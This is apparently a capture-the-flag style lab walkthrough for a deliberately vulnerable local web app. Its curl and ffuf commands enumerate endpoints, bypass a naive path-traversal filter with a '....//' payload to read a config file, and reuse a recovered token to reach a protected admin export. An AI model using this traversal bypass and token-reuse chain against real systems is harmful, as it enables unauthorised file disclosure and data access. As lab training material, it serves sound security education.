# Web Traversal And Token Reuse Lab Walkthrough

## Goal

Discover the vulnerable download flow, bypass traversal filtering, recover the export token, and use it to access protected data.

## Expected path

1. Enumerate the application:

```bash
ffuf -u http://localhost:8085/FUZZ -w /usr/share/wordlists/dirb/common.txt
```

Look for:

- `/download.php`
- `/release-notes.php`
- `/status.php`
- `/docs/connector.txt`

2. Inspect the legitimate download flow:

```bash
curl "http://localhost:8085/download.php?file=files/network-faq.txt"
```

3. Test traversal. A direct payload may be normalized away, but the filter is naive. Use a bypass such as:

```bash
curl "http://localhost:8085/download.php?file=....//....//....//opt/vulnlab/config/portal.env"
```

4. Recover the export header name and token from the disclosed file:

- `EXPORT_HEADER=X-Lab-Token`
- `EXPORT_TOKEN=export-token-7421`
- `EXPORT_ROUTE=/admin/export.php`

5. Reuse the recovered token to access the protected export:

```bash
curl -H "X-Lab-Token: export-token-7421" http://localhost:8085/admin/export.php
```

6. Confirm the protected export data:

- `INTERNAL_EXPORT_OK`
- internal metadata and owner information

## Learning outcome

- download endpoint enumeration
- traversal filter bypass
- chaining file disclosure into second-stage protected data access
